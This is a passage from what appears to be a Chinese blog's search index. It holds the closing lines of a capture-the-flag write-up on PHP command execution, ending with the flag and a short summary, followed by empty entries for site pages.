src="/imgs/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/08.png"></p><p>添加后双击打开，管理文件</p><p><img src="/imgs/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/09.png"></p><p><img src="/imgs/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/10.png"></p><p><img src="/imgs/PHP%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/11.png"></p><p>得到flag</p><p>自此这题圆满解决。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>在碰到这样的命令执行问题时，要多多寻找方法，才能充实自己。前5种方法均涉及linux操作方法，在大家学习命令执行之前应多学学linux操作系统代码，这是学习web的基础。本篇文章是小编结合了许多大佬的解题思路后总结的，希望对大家学习web有所帮助。以上文章有不足之处，请大家留言指出，一起进步。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP漏洞利用 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>categories</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>关于</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>留言板</title>
      <link href="/comments/index.html"/>
      <url>/comments/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>友链</title>
      <link href="/link/index.html"/>
      <url>/link/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>音乐</title>
      <link href="/music/index.html"/>
      <url>/music/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>电影</title>
      <link href="/movies/index.html"/>
      <url>/movies/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>tags</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
